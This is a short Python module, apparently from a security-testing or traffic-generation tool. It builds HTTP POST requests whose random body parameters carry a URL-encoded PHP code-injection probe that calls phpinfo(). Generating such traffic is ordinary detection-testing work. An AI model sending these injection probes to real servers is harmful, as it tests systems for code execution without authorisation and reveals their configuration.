import random
import string
from module import common
from urllib.parse import unquote, quote


class codeinject:
    common = None
    payloads = []

    def __init__(self, common=None):
        if (common != None):
            self.common = common

    def generate_payload(self, amount):
        for _ in range(amount):
            parame = "{}={}".format(self.common.get_random_parame()[0], '%22%70%68%70%69%6e%66%6f%22%28%29%3b')
            self.payloads.append(parame)

    def generate_packages(self, amount):
        self.generate_payload(amount)
        packages = [self.common.generate(self.payloads[i],
                                         method="POST",
                                         payload_location="body_parame") for i in range(amount)]
        return packages
